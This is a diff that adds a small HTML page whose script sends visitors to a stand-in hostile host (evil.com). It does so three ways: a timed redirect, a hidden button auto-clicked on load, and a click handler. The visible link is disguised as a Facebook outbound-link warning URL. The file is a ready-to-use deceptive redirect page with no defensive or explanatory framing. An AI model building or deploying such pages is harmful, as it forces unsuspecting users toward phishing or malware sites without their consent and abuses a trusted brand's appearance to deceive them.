@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Method 1: Delay-based auto-redirect
+        setTimeout(function() {
+            window.location.href = "https://evil.com";
+        }, 500);
+
+        // Method 2: Simulating a user action for auto-click
+        function fakeClick() {
+            let button = document.createElement("button");
+            button.style.display = "none";
+            document.body.appendChild(button);
+            button.click();
+            window.location.href = "https://evil.com";
+        }
+
+        // Method 3: OnClick Instant Redirect
+        function instantRedirect() {
+            window.location.href = "https://evil.com";
+        }
+    </script>
+</head>
+<body onload="fakeClick()">
+    <a href="https://facebook.com/flx/warn/?u=https://evil.com" onclick="instantRedirect()">Click Here to Continue</a>
+</body>
+</html>
